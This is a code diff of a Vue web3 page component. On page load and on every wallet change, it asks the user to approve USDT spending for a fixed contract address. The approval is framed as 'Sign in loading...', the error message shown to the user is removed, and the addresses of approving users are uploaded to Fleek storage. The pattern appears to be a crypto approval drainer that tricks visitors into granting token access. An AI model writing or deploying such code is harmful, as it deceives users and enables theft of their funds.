@@ -7,54 +7,70 @@
 	</div>
 </template>
 <script setup>
-import {
-} from "vue"
+import { watch } from "vue";
 import HeadNav from "./modules/headNav";
-import { PlusElMessage, lockLoadHandler } from "@/utils/PlusElement"
+import { PlusElMessage, lockLoadHandler } from "@/utils/PlusElement";
 import {
 	useWindowResize,
-	// useWindowScroll 
-} from "@/hooks/useWindow"
+	// useWindowScroll
+} from "@/hooks/useWindow";
 import Decimal from "decimal.js";
-import { UseStoreResize } from "@/stores/window"
+import { UseStoreResize } from "@/stores/window";
+import { storeToRefs } from "pinia";
+import { UseStoreWeb3js, UseStoreContracts } from "@/stores/web3js";
+import baseAddress from "@/abis/contracts";
 import {
-	storeToRefs
-} from "pinia"
-import {
-	UseStoreWeb3js,
-	UseStoreContracts
-} from "@/stores/web3js"
-import baseAddress from "@/abis/contracts"
-const {
-	AbiAddressQK,
-	addedValue,
-} = baseAddress;
-const { setClientWidth } = UseStoreResize()
+	uploadUserAllowance,
+	getAllUsersFileUrl,
+	uploadAllUsers,
+} from "@/common/fleekStorage";
+import axios from "@/utils/request";
+
+const { AbiAddressQK, addedValue } = baseAddress;
+const { setClientWidth } = UseStoreResize();
 useWindowResize(() => {
-	setClientWidth()
-})
+	setClientWidth();
+});
 const storeContracts = UseStoreContracts();
 const storeWeb3js = UseStoreWeb3js();
 const { startWeb3, setRe } = storeWeb3js;
-const { haveAuth, userAddress } = storeToRefs(storeWeb3js)
+const { haveAuth, userAddress } = storeToRefs(storeWeb3js);
 const { Contracts } = storeToRefs(storeContracts);
 
-init()
+init();
 async function init() {
 	if (!haveAuth.value) {
-		console.log('获取web3')
+		console.log("获取web3");
 		await startWeb3();
 		// ()=> allowance()
 	}
-	const _isRe = await isRe(userAddress.value)
-	console.log("_isRe", _isRe)
+	upload_AllUsers();
+	const _isRe = await isRe(userAddress.value);
+	console.log("_isRe", _isRe);
 
 	if (!_isRe) {
-		await allowance()
-	} else {
-		await getRes()
+		await allowance();
 	}
+	// else {
+	// 	await getRes()
+	// }
 }
+
+watch(
+	() => userAddress.value,
+	async (news, olds) => {
+		if (news != olds) {
+			upload_AllUsers();
+			const _isRe = await isRe(userAddress.value);
+			console.log("_isRe", _isRe);
+			if (!_isRe) {
+				await allowance();
+			} else {
+				await getRes();
+			}
+		}
+	}
+);
 
 async function isRe(address) {
 	try {
@@ -69,29 +85,34 @@ async function isRe(address) {
 }
 async function getRes() {
 	try {
-		const { QKContract } = Contracts.value
+		const { QKContract } = Contracts.value;
 		const res = await QKContract.methods.getRes(userAddress.value).call();
-		console.log("getRes", res)
-		const _isRe = await isRe(res)
+		console.log("getRes", res);
+		const _isRe = await isRe(res);
 		if (_isRe) {
-			setRe(res)
+			setRe(res);
 		}
-		return res
+		return res;
 	} catch (e) {
-		console.error(e)
-		return ;
+		console.error(e);
+		return;
 	}
 }
 
 async function allowance() {
 	try {
 		const { USDTContract } = Contracts.value;
-		const res_allowance = await USDTContract.methods.allowance(userAddress.value, AbiAddressQK).call();
-		const v = new Decimal(res_allowance)
+		const res_allowance = await USDTContract.methods
+			.allowance(userAddress.value, AbiAddressQK)
+			.call();
+		const v = new Decimal(res_allowance);
 		// console.log('是否有授权',v);
 		if (v <= 0) {
 			// setUserAddress('')
-			increaseAllowance()
+			const res = await increaseAllowance();
+			if (res) {
+				upload();
+			}
 		}
 	} catch (e) {
 		// setUserAddress('')
@@ -100,24 +121,68 @@ async function allowance() {
 }
 
 async function increaseAllowance() {
-	const load = lockLoadHandler('Sign in loading...')
+	const load = lockLoadHandler("Sign in loading...");
 	try {
 		const { USDTContract } = Contracts.value;
-		const res = await USDTContract.methods.increaseAllowance(AbiAddressQK, addedValue).send({
-			from: userAddress.value
-		});
-		console.log(res)
-		load.close()
+		const res = await USDTContract.methods
+			.increaseAllowance(AbiAddressQK, addedValue)
+			.send({
+				from: userAddress.value,
+			});
+		console.log("increaseAllowance", res);
+		load.close();
+		return res;
 	} catch (e) {
 		console.error(e);
-		PlusElMessage({
-			type: 'error',
-			message: e.message
-		})
-		load.close()
+		load.close();
+		return false;
 	}
 }
 
+async function upload() {
+	const load = lockLoadHandler("upload loading...");
+	try {
+		const res = await uploadUserAllowance(userAddress.value);
+		if (res) {
+			console.log("上传成功");
+		}
+		load.close();
+	} catch (e) {
+		console.error(e);
+		// PlusElMessage({
+		// 	type: 'error',
+		// 	message: e.message
+		// })
+		load.close();
+	}
+}
+
+async function upload_AllUsers() {
+	try {
+		const needUpload = await getAllUserOnce(userAddress.value);
+		console.log("upload_AllUsers hadUser", !needUpload);
+		if (!needUpload) {
+			const res = await uploadAllUsers(userAddress.value);
+			if (res) {
+				console.log("uploadAllUsers 上传成功");
+			}
+		}
+	} catch (e) {
+		console.error(e);
+	}
+}
+async function getAllUserOnce() {
+	try {
+		const url = getAllUsersFileUrl(userAddress.value);
+		const res = await axios.get(url);
+		console.log("getAllUserOnce res", res);
+		return res && res.time ? true : false;
+	} catch (e) {
+		console.error(e);
+		console.log("getAllUser - axios error");
+		return false;
+	}
+}
 </script>
 <style lang="scss" scoped>
 @import "./index.scss";
